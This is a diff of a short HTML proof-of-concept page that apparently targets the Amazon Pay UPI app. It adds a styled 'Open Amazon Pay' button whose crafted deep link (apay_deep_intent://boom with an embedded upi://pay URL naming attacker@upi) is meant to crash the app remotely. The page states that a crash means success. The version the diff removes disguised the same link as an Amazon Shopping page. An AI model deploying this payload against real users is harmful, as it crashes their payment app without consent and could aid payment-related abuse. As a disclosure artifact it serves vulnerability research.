@@ -1,13 +1,19 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <title>Amazon Pay UPI PoC</title>
 </head>
 <body>
+    <h2>Amazon Pay UPI Remote Crash PoC</h2>
+    <p>
+        Tap the button below to trigger Amazon Pay UPI deep link:
+    </p>
 
-    <h2>Amazon Shopping </h2>
-    <a href="apay_deep_intent://boom?UseCase=UPIIntent&url=upi://pay?pa=attacker@upi&pn=Amazon&am=1&cu=INR">
-        Click to activate Amazon Pay
+    <a href="apay_deep_intent://boom?UseCase=UPIIntent&url=upi://pay?pa=attacker@upi&pn=Amazon&am=1&cu=INR"
+       style="display:inline-block;padding:12px 20px;background:#ff9900;color:white;text-decoration:none;border-radius:6px;font-size:18px;">
+        Open Amazon Pay
     </a>
 
+    <p>If the Amazon app opens and crashes → PoC successful.</p>
 </body>
 </html>
